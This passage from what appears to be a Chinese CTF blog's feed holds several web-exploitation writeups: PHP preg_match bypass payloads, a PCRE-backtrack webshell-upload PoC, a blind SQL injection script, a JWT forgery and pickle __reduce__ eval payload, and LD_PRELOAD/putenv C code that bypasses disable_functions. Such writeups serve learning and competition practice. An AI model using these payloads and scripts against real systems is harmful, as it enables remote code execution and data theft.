$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件    //签名自动计算    $phar-&gt;stopBuffering();?&gt;</code></pre><p>然后调用phar://sakura.php</p><p>是一样的效果。</p><h1 id="漏洞的利用条件"><a href="#漏洞的利用条件" class="headerlink" title="漏洞的利用条件"></a>漏洞的利用条件</h1><ol><li>phar文件要能够上传到服务器端。</li><li>要有可用的魔术方法作为“跳板”。</li><li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤。</li></ol><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><ol><li>在文件系统函数的参数可控时，对参数进行严格的过滤。</li><li>严格检查上传文件的内容，而不是只检查文件头。</li><li>在条件允许的情况下禁用可执行系统命令、代码的危险函数。</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 反序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>preg_match正则绕过总结</title>
      <link href="/2021/10/26/preg-match%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/"/>
      <url>/2021/10/26/preg-match%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>最近写题遇到了很多次pre_match函数，但并不是每次都可以绕过。于是想要把这个函数总结一下用法。我个人认为preg_match的绕过方法主要取决于其正则表达式的写法。</p><p>首先对正则表达式的常见符号解释一下。</p><p>/    /    是一种格式吧，正则表达式需要写在这个里面</p><p>^：匹配输入字符串的开始位置</p><p>$：匹配输入字符串的结束位置</p><h1 id="换行符绕过-0a"><a href="#换行符绕过-0a" class="headerlink" title="换行符绕过(%0a)"></a>换行符绕过(%0a)</h1><pre><code class="php">&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);$c = $_GET[&#39;c&#39;];if (preg_match(&#39;/^flag$/i&#39;, $c) &amp;&amp; $c !== &#39;flag&#39;) &#123;    echo $flag;&#125;else&#123;    echo &quot;nonono&quot;;&#125;</code></pre><p>由于pre_match这个函数是只能匹配一行的数据，所以我们可以用%0a(也就是换行符)来绕过。</p><p>这里是因为$会忽略换行符</p><p>因此本题我们传入?c=flag%0a  即可绕过</p><p>注意此时正则表达式的模式是: i</p><h1 id="利用数组绕过"><a href="#利用数组绕过" class="headerlink" title="利用数组绕过"></a>利用数组绕过</h1><p> preg_match只能处理字符串，当传入的subject是数组时会返回false</p><h1 id="5c绕过"><a href="#5c绕过" class="headerlink" title="%5c绕过"></a>%5c绕过</h1><pre><code class="php">&lt;?php show_source(__FILE__); $key = &quot;bad&quot;; extract($_POST);        // 使用POST接收参数 if($key === &#39;bad&#39;)&#123;        // $key 与 &#39;bad&#39; 进行比较，值不相同时才可以继续运行代码    die(&#39;badbad!!!&#39;); &#125; $act = @$_GET[&#39;act&#39;];    // 获得 act 参数 $arg = @$_GET[&#39;arg&#39;];    // 获得 arg 参数 if(preg_match(&#39;/^[a-z0-9_]*$/isD&#39;,$act)) &#123;    // 针对act参数进行过滤    echo &#39;check&#39;; &#125; else &#123;    $act($arg,&#39;&#39;);        // 动态调用 &#125; echo &#39;666&#39;;</code></pre><pre><code>/i不区分大小写/s匹配任何不可见字符，包括空格、制表符、换页符等等，等价于[fnrtv]/D如果使用$限制结尾字符,则不允许结尾有换行;</code></pre><p>这里存在/s和/D因此它会匹配到换行，%0a因此就无法绕过。这时候就可以使用%5c</p><h1 id="preg-match-“-e”-注：php版本需要小于5-5-0"><a href="#preg-match-“-e”-注：php版本需要小于5-5-0" class="headerlink" title="preg_match(“/^$/e”) (注：php版本需要小于5.5.0)"></a>preg_match(“/^$/e”) (注：php版本需要小于5.5.0)</h1><pre><code class="php">&lt;?highlight_file(__FILE__);echo preg_replace(&quot;/test/e&quot;,$_GET[&quot;h&quot;],&quot;jutst test&quot;);?&gt;</code></pre><p>payload=xx?h=phpinfo();</p><h1 id="PHP利用PCRE回溯次数限制绕过某些安全限制"><a href="#PHP利用PCRE回溯次数限制绕过某些安全限制" class="headerlink" title="PHP利用PCRE回溯次数限制绕过某些安全限制"></a>PHP利用PCRE回溯次数限制绕过某些安全限制</h1><p>poc</p><pre><code class="php">import requestsfrom io import BytesIOfiles = &#123;  &#39;file&#39;: BytesIO(b&#39;aaa&lt;?php eval($_POST[txt]);//&#39; + b&#39;a&#39; * 1000000)&#125;res = requests.post(&#39;http://51.158.75.42:8088/index.php&#39;, files=files, allow_redirects=False)print(res.headers)</code></pre><p>payload:?a=ssss………..省略n个字符，突破100万</p><h1 id="异或绕过"><a href="#异或绕过" class="headerlink" title="异或绕过"></a>异或绕过</h1><pre><code class="php">&lt;?phperror_reporting(0);if(isset($_GET[&#39;code&#39;]))&#123;        $code=$_GET[&#39;code&#39;];            if(strlen($code)&gt;40)&#123;                    die(&quot;This is too Long.&quot;);                    &#125;            if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;                    die(&quot;NO.&quot;);                    &#125;            @eval($code);&#125;else&#123;        highlight_file(__FILE__);&#125;highlight_file(__FILE);// ?&gt;</code></pre><p>可以使用各种特殊字符的异或构造出字母和数字</p><p>脚本：</p><pre><code class="php">str = r&quot;~!@#$%^&amp;*()_+&lt;&gt;?,.;:-[]&#123;&#125;/&quot;for i in range(0, len(str)):    for j in range(0, len(str)):        a = ord(str[i])^ord(str[j])        print(str[i] + &#39; ^ &#39; + str[j] + &#39; is &#39; + chr(a))</code></pre><p>payload:</p><pre><code class="php">?code=$_=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$_&#125;[_]();&amp;_=phpinfo</code></pre><h1 id="取反绕过"><a href="#取反绕过" class="headerlink" title="取反绕过"></a>取反绕过</h1><p>把getFlag取反然后URL编码： </p><pre><code class="php"> &lt;?php echo urlencode(~&quot;getFlag&quot;); </code></pre><p>–&gt; %98%9A%8B%B9%93%9E%98</p><p>依据这个我们可以构造payload: </p><pre><code class="php"> ?code=$_=~%98%9A%8B%B9%93%9E%98;$_(); </code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 常见函数 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> preg_match </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GWCTF 2019枯燥的抽奖_0x30-0x3f</title>
      <link href="/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/"/>
      <url>/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/image-20211024235829685.png" alt="image-20211024235829685"></p><p>查看源代码</p><p><img src="/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/image-20211024235901200.png" alt="image-20211024235901200"></p><p>看到一个关键点，check.php，访问一下</p><pre><code class="php"> &lt;?php#这不是抽奖程序的源代码！不许看！header(&quot;Content-Type: text/html;charset=utf-8&quot;);session_start();if(!isset($_SESSION[&#39;seed&#39;]))&#123;$_SESSION[&#39;seed&#39;]=rand(0,999999999);&#125;mt_srand($_SESSION[&#39;seed&#39;]);$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str=&#39;&#39;;$len1=20;for ( $i = 0; $i &lt; $len1; $i++ )&#123;    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       &#125;$str_show = substr($str, 0, 10);echo &quot;&lt;p id=&#39;p1&#39;&gt;&quot;.$str_show.&quot;&lt;/p&gt;&quot;;if(isset($_POST[&#39;num&#39;]))&#123;    if($_POST[&#39;num&#39;]===$str)&#123;x        echo &quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;;    &#125;    else&#123;        echo &quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;;    &#125;&#125;show_source(&quot;check.php&quot;); </code></pre><p>这里涉及到了伪随机数漏洞，即当确定了种子后，随机数每次生成数的所有数是重复得，并不是真正意义上的随机数。</p><pre><code class="php">&lt;?php  mt_srand(12345);    echo mt_rand().&quot;&lt;br/&gt;&quot;;?&gt;  </code></pre><p>当你每次运行这个函数得到的随机数都是相同的。</p><p>这个就像一个关系式：y=ax，如果我们能得到y和a就可以推出x。</p><p>当然，实际上这个函数的关系是十分复杂的，但我们仍然可以用工具去破解。</p><p>首先，我们要把题目给我们的线索转化为脚本可读的形式：</p><p><img src="/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/image-20211025011936452.png" alt="image-20211025011936452"></p><pre><code class="python">str1 = &#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;str2 = &#39;nngMHvCoQB&#39;res = &#39;&#39;for i in range(len(str2)):    for j in range(len(str1)):        if str2[i] == str1[j]:            res += str(j)+&#39; &#39;+str(j)+&#39; &#39;+&#39;0&#39;+&#39; &#39;+str(len(str1)-1)+&#39; &#39;            breakprint(res)</code></pre><p>![image-20211025012020617](GWCTF-2019枯燥的抽奖-0x30-0x3f/image-20211025012020617.png</p><p><img src="/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/Kali-Linux-2021.3-vmware-amd64-2021-10-25-01-20-39.png" alt="Kali-Linux-2021.3-vmware-amd64-2021-10-25-01-20-39"></p><p>获得到了种子，我们来生成下后序的字符串：</p><p><img src="/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/image-20211025012917063.png" alt="image-20211025012917063"></p><p>我们看到前面十位完全吻合。</p><p>提交：</p><p><img src="/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/image-20211025013042600.png" alt="image-20211025013042600"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 伪随机数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WUSTCTF2020 颜值成绩查询_0x21-0x2F</title>
      <link href="/2021/10/22/WUSTCTF2020-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2-0x21-0x2F/"/>
      <url>/2021/10/22/WUSTCTF2020-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2-0x21-0x2F/</url>
      
        <content type="html"><![CDATA[<p>进去只有一个简单得输入框，测试下是否存在sql注入</p><p><img src="/2021/10/22/WUSTCTF2020-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2-0x21-0x2F/image-20211022145243657.png" alt="image-20211022145243657"></p><p>先输入1，2，3等</p><p>发现有数据显示</p><p>使用异或</p><p><a href="http://fba65ac4-7e1e-4c73-bb3b-35bfdef68f71.node4.buuoj.cn:81/?stunum=0%5E1">http://fba65ac4-7e1e-4c73-bb3b-35bfdef68f71.node4.buuoj.cn:81/?stunum=0^1</a></p><p>结果显示得是stunum=1的界面</p><p>说明存在sql盲注</p><p>写一个简单脚本：</p><pre><code>import requestsimport timeurl = &quot;http://fba65ac4-7e1e-4c73-bb3b-35bfdef68f71.node4.buuoj.cn:81/&quot;data= &quot;&quot;for i in range(10000):    min = 32    max = 128    while (min &lt; max) :        mid = (min + max) // 2    # 爆破数据库名        #payload = &quot;?stunum=0^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)&quot;%(i,mid)    # 爆破表名        #payload = &quot;?stunum=0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&gt;%d)&quot;%(i,mid)    # 爆破字段        #payload = &quot;?stunum=0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;)),%d,1))&gt;%d)&quot;%(i,mid)    # 爆破数据        payload = &quot;?stunum=0^(ascii(substr((select(group_concat(value))from(flag)),%d,1))&gt;%d)&quot;%(i,mid)        urls = url+payload        print(urls)        response = requests.get(url=urls)        time.sleep(0.2)        if &quot;Hi admin, your score is: 100&quot; in response.text:            min = mid+1        else:            max = mid        mid = (min + max) // 2    data += chr(mid)    print(data)</code></pre><p><img src="/2021/10/22/WUSTCTF2020-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2-0x21-0x2F/image-20211022145433880.png" alt="image-20211022145433880"></p><p>写这个脚本花了挺长时间，原因是对sql注入语句还不熟练，容易被括号迷惑，看晕。</p><p>以后要注重写代码的能力。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2019 华北赛区 Day1 Web2 ikun_0x10-0x1F</title>
      <link href="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/"/>
      <url>/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/</url>
      
        <content type="html"><![CDATA[<p>一打开页面，很魔性。。</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020233731895.png" alt="image-20211020233731895"></p><p>先注册个账号</p><p>下面提示一定要买到lv6</p><p>翻了好几面，没有找到，于是写了一个简单的爬虫脚本：S</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020234222133.png" alt="image-20211020234222133"></p><p>注意爬虫要慢一点，buu很容易崩。</p><pre><code class="python">import urllib.requestimport timefor i in range(0,1000):    url = &#39;http://272059db-2e14-4adc-ae85-8f5a64a35acb.node4.buuoj.cn:81/shop?page=&#39;+str(i)    print(url)    time.sleep(1)    response = urllib.request.urlopen(url).read().decode(&#39;utf-8&#39;)    if &#39;lv6.png&#39; in response:        print(i)        break</code></pre><p>发现在181面</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020234439410.png" alt="image-20211020234439410"></p><p>不过钱却不太够，用burp抓下包试一试</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020234524015.png" alt="image-20211020234524015"></p><p>发现discount=0.8，将它改小</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020234610565.png" alt="image-20211020234610565"></p><p>发现只允许admin登录</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020234638452.png" alt="image-20211020234638452"></p><p>仔细分析下数据包，发现了jwt，解一下码：</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020235006767.png" alt="image-20211020235006767"></p><p>爆破一下（感觉这个挺靠运气和字典吧）</p><p>发现密钥为 1Kun</p><p>重新生成admin的jwt</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020235300543.png" alt="image-20211020235300543"></p><p>查看源代码:</p><p>在这里发现源码泄露：</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020235354388.png" alt="image-20211020235354388"></p><p>下载下来，找到一个叫admin.py的文件，打开</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020235429287.png" alt="image-20211020235429287"></p><p>看到了pickle，查阅资料可知：</p><p>假设你有一个字典，你想存储它，稍后再取出来。你可以把它的内容写入一个文件，小心翼翼地确保使用了正确地格式，要把它读取出来，你可以使用 exec() 或处理文件输入。但是这种方法并不可靠：如果你使用纯文本来存储重要数据，数据很容易以多种方式被破坏或者修改，导致你的程序崩溃，更糟糕的情况下，还可能在你的计算机上运行恶意代码。因此，我们要pickle它:</p><pre><code>import pickledata = &#123;&#39;foo&#39;: [1,2,3],                &#39;bar&#39;: (&#39;Hello&#39;, &#39;world!&#39;),                &#39;baz&#39;: True&#125;jar = open(&#39;data.pkl&#39;, &#39;wb&#39;)pickle.dump(data, jar) # 将pickle后的数据写入jar文件jar.close()</code></pre><p>过了几个小时，我们想把它取出来，我们只需要反pickle它:</p><pre><code>import picklepkl_file = open(&#39;data.pkl&#39;, &#39;rb&#39;) # 与pickle后的数据连接data = pickle.load(pkl_file) # 把它加载进一个变量print datapkl_file.close()</code></pre><p>将会发生什么？正如你期待的，它就是我们之前的 data 。</p><p>现在，还需要谨慎地说一句：  pickle并不完美。Pickle文件很容易因为事故或被故意的破坏掉。Pickling或许比纯文本文件安全一些，但是依然有可能被用来运行恶意代码。而且它还不支持跨Python版本，所以不要指望分发pickle对象之后所有人都能正确地读取。然而不管怎么样，它依然是一个强有力的工具，可以用于缓存和其他类型的持久化工作。</p><h3 id="11-13-2-Pickle你的对象"><a href="#11-13-2-Pickle你的对象" class="headerlink" title="11.13.2. Pickle你的对象"></a><a href="http://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html#id53">11.13.2. Pickle你的对象</a></h3><p>Pickle不仅仅可以用于内建类型，任何遵守pickle协议的类都可以被pickle。Pickle协议有四个可选方法，可以让类自定义它们的行为（这和C语言扩展略有不同，那不在我们的讨论范围之内）。</p><ul><li> <strong>getinitargs</strong>(self)</li></ul><p>  如果你想让你的类在反pickle时调用 <strong>init</strong> ，你可以定义__getinitargs__(self) ，它会返回一个参数元组，这个元组会传递给__init__ 。注意，这个方法只能用于旧式类。</p><ul><li> <strong>getnewargs</strong>(self)</li></ul><p>  对新式类来说，你可以通过这个方法改变类在反pickle时传递给 <strong>new</strong> 的参数。这个方法应该返回一个参数元组。</p><ul><li> <strong>getstate</strong>(self)</li></ul><p>  你可以自定义对象被pickle时被存储的状态，而不使用对象的 <strong>dict</strong> 属性。 这个状态在对象被反pickle时会被 <strong>setstate</strong> 使用。</p><ul><li> <strong>setstate</strong>(self)</li></ul><p>  当一个对象被反pickle时，如果定义了 <strong>setstate</strong> ，对象的状态会传递给这个魔法方法，而不是直接应用到对象的 <strong>dict</strong> 属性。这个魔法方法和__getstate__ 相互依存：当这两个方法都被定义时，你可以在Pickle时使用任何方法保存对象的任何状态。</p><ul><li> <strong>reduce</strong>(self)</li></ul><p>  当定义扩展类型时（也就是使用Python的C语言API实现的类型），如果你想pickle它们，你必须告诉Python如何pickle它们。 <strong>reduce</strong> 被定义之后，当对象被Pickle时就会被调用。它要么返回一个代表全局名称的字符串，Pyhton会查找它并pickle，要么返回一个元组。这个元组包含2到5个元素，其中包括：一个可调用的对象，用于重建对象时调用；一个参数元素，供那个可调用对象使用；被传递给 <strong>setstate</strong> 的状态（可选）；一个产生被pickle的列表元素的迭代器（可选）；一个产生被pickle的字典元素的迭代器（可选）；</p><ul><li> <strong>reduce_ex</strong>(self)</li></ul><p>  <strong>reduce_ex</strong> 的存在是为了兼容性。如果它被定义，在pickle时__reduce_ex__ 会代替 <strong>reduce</strong> 被调用。 <strong>reduce</strong> 也可以被定义，用于不支持 <strong>reduce_ex</strong> 的旧版pickle的API调用。</p><p>这里构造payload,传给become：</p><pre><code>import pickleimport urllibclass payload(object):    def __reduce__(self):       return (eval, (&quot;open(&#39;/flag.txt&#39;,&#39;r&#39;).read()&quot;,))a = pickle.dumps(payload())a = urllib.quote(a)print a</code></pre><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020235644482.png" alt="image-20211020235644482"></p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020235657704.png" alt="image-20211020235657704"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jwt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通过LD_PRELOAD与putenv组合拳绕过disable_functions函数</title>
      <link href="/2021/10/19/%E9%80%9A%E8%BF%87LD-PRELOAD%E4%B8%8Eputenv%E7%BB%84%E5%90%88%E6%8B%B3%E7%BB%95%E8%BF%87disable-functions%E5%87%BD%E6%95%B0/"/>
      <url>/2021/10/19/%E9%80%9A%E8%BF%87LD-PRELOAD%E4%B8%8Eputenv%E7%BB%84%E5%90%88%E6%8B%B3%E7%BB%95%E8%BF%87disable-functions%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<p>使用场景：</p><p>当拿到了一个网站shell，但命令基本都无法使用时，就很有可能是disable_functions导致的。</p><p>无命令执行功能的 webshell 是无意义的，得突破！</p><p>首先来介绍下我们需要使用的两个函数：</p><p>LD_PRELOAD:</p><p>google给出如下定义：</p><pre><code>LD_PRELOAD is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library.</code></pre><p>即LD_PRELOAD这个环境变量指定路径的文件，会在其他文件被调用前，最先被调用。</p><p>PUTENV函数：可以设置环境变量</p><pre><code class="php">putenv ( string $setting ) : bool</code></pre><p>添加 setting 到服务器环境变量。 环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态。</p><p>一般而言，利用漏洞控制 web 启动新进程 a.bin，a.bin 内部调用系统函数 b()，b()  位于系统共享对象 c.so  中，所以系统为该进程加载共 c.so，想法在 c.so 前优先加载可控的 c_evil.so，c_evil.so  内含与 b()  同名的恶意函数，由于 c_evil.so 优先级较高，所以，a.bin 将调用到 c_evil.so 内 b() 而非系统的  c.so 内  b()，同时，c_evil.so 可控，达到执行恶意代码的目的。</p><h2 id="传统方式-hijacking-function"><a href="#传统方式-hijacking-function" class="headerlink" title="传统方式(hijacking function)"></a>传统方式(hijacking function)</h2><p>在已有的文章中显示，一般使用php<code>mail()</code>函数进行触发，我们简单分析一下</p><p>这里简单写个demo</p><pre><code class="php">&lt;?phpmail(&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;);?&gt;</code></pre><p>我们strace一下，可以看到运行这个脚本的时候，程序会启子进程来调用sendmail</p><pre><code>execve(&quot;/usr/bin/php&quot;, [&quot;php&quot;, &quot;test.php&quot;], [/* 20 vars */]) = 0[pid 23864] execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;/usr/sbin/sendmail -t -i &quot;], [/* 20 vars */]) = 0[pid 23865] execve(&quot;/usr/sbin/sendmail&quot;, [&quot;/usr/sbin/sendmail&quot;, &quot;-t&quot;, &quot;-i&quot;], [/* 20 vars */]) = 0</code></pre><p>那么我们只要看一下sendmail使用了哪些函数</p><p><a href="https://p5.ssl.qhimg.com/t01c76b4a9b6bc50197.png"><img src="/2021/10/19/%E9%80%9A%E8%BF%87LD-PRELOAD%E4%B8%8Eputenv%E7%BB%84%E5%90%88%E6%8B%B3%E7%BB%95%E8%BF%87disable-functions%E5%87%BD%E6%95%B0/t01c76b4a9b6bc50197.png" alt="img"></a></p><p>有很多函数可以使用，这里可以选择geteuid()，然后我们编写自己的evil shared libraries：hack.c</p><pre><code class="c">#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void payload() &#123;        system(&quot;ls / &gt; /tmp/sky&quot;);&#125;int geteuid() &#123;    if (getenv(&quot;LD_PRELOAD&quot;) == NULL) &#123; return 0; &#125;    unsetenv(&quot;LD_PRELOAD&quot;);    payload();&#125;</code></pre><p>然后编译一下</p><pre><code>gcc -c -fPIC hack.c -o hackgcc --share hack -o hack.so</code></pre><p>然后我们运行脚本</p><pre><code class="php">&lt;?phpputenv(&quot;LD_PRELOAD=./hack.so&quot;);mail(&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;);?&gt;</code></pre><p><a href="https://p0.ssl.qhimg.com/t01afcea293e08668c6.png"><img src="/2021/10/19/%E9%80%9A%E8%BF%87LD-PRELOAD%E4%B8%8Eputenv%E7%BB%84%E5%90%88%E6%8B%B3%E7%BB%95%E8%BF%87disable-functions%E5%87%BD%E6%95%B0/t01afcea293e08668c6.png" alt="img"></a></p><p>不难发现它执行了命令，然后可以发现/tmp目录下多了一个文件sky</p><pre><code>root@sky:~# ls /tmp | grep skysky</code></pre><p>我们查看一下</p><pre><code>root@sky:~# cat /tmp/skybinbootdevetchomeliblib32....</code></pre><p>发现成功执行命令</p><p>但是这是基于存在sendmail()这个常用函数的基础上，如果目标的sendmail()函数也被禁用了那该怎么办呢？</p><p>下面来介绍改进版的：</p><h2 id="改进版-hijack-shared-library"><a href="#改进版-hijack-shared-library" class="headerlink" title="改进版(hijack shared library)"></a>改进版(hijack shared library)</h2><p>已经没有了sendmail，但我们依旧可以进行rce，可使用如下文件sky.c</p><pre><code>#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;__attribute__ ((__constructor__)) void angel (void)&#123;    unsetenv(&quot;LD_PRELOAD&quot;);    system(&quot;ls&quot;);&#125;</code></pre><p>其中<code>__attribute__ ((__constructor__))</code>有如下说明</p><pre><code>1.It&#39;s run when a shared library is loaded, typically during program startup.2.That&#39;s how all GCC attributes are; presumably to distinguish them from function calls.3.The destructor is run when the shared library is unloaded, typically at program exit.</code></pre><p>所以当我们最开始将evil shared library load上后，就会触发<code>__attribute__ ((__constructor__))</code>，从而达成我们rce的目的.</p><p>常考察的还有php-imagick</p><p>我们发现如下对应关系</p><p><a href="https://p0.ssl.qhimg.com/t018ee5e5eadefc3997.png"><img src="/2021/10/19/%E9%80%9A%E8%BF%87LD-PRELOAD%E4%B8%8Eputenv%E7%BB%84%E5%90%88%E6%8B%B3%E7%BB%95%E8%BF%87disable-functions%E5%87%BD%E6%95%B0/t018ee5e5eadefc3997.png" alt="img"></a></p><p>我们发现当文件是MPEG format时，程序会调用’ffmpeg’ program进行转换，而如下后缀都被认为成MPEG format</p><p><a href="https://p2.ssl.qhimg.com/t01b63cd8517778cd0f.png"><img src="/2021/10/19/%E9%80%9A%E8%BF%87LD-PRELOAD%E4%B8%8Eputenv%E7%BB%84%E5%90%88%E6%8B%B3%E7%BB%95%E8%BF%87disable-functions%E5%87%BD%E6%95%B0/t01b63cd8517778cd0f.png" alt="img"></a></p><p>我们测试一下.wmv</p><p>写出脚本</p><pre><code class="php">&lt;?php$img = new Imagick(&#39;sky.wmv&#39;);?&gt;</code></pre><p>我们测试一下</p><pre><code>execve(&quot;/usr/bin/php&quot;, [&quot;php&quot;, &quot;sky.php&quot;], [/* 21 vars */]) = 0[pid 25217] execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;&quot;ffmpeg&quot; -v -1 -i &quot;/tmp/magick-2&quot;...], [/* 21 vars */]) = 0</code></pre><p>可以发现的确成功启动了子进程，调用了ffmpeg</p><p>但是如果sky.wmv文件不存在时</p><pre><code>execve(&quot;/usr/bin/php&quot;, [&quot;php&quot;, &quot;sky.php&quot;], [/* 21 vars */]) = 0</code></pre><p>则不会调用ffmpeg</p><p>所以也不难分析出，应该是有一步判断文件是否存在的操作，再会去进行调用相关程序进行解码转换的操作</p><p>所以如果想利用Imagick新起子进程，那么我们得先有后面的参数文件，当然这并不是什么难事。</p><p> payload &amp; attack</p><p>那么只剩最后的攻击了，找到了可以起子进程的方式，只差构造evil shared library了</p><p>我们还是用之前的sky.c</p><pre><code class="c">#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;__attribute__ ((__constructor__)) void angel (void)&#123;    unsetenv(&quot;LD_PRELOAD&quot;);    system(&quot;ls&quot;);&#125;</code></pre><p>然后编译一下</p><pre><code>gcc -c -fPIC sky.c -o skygcc --share sky -o sky.so</code></pre><p>测试一下</p><pre><code class="php">&lt;?phpputenv(&quot;LD_PRELOAD=./sky.so&quot;);$img = new Imagick(&#39;sky.wmv&#39;);?&gt;</code></pre><p>运行发现</p><pre><code>root@sky:~# php sky.phpbin  boot  dev  etc  home  initrd.img  initrd.img.old  lib  lib32  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys    test  tmp  usr    var  vmlinuz  vmlinuz.oldPHP Fatal error:  Uncaught ImagickException: unable to open image 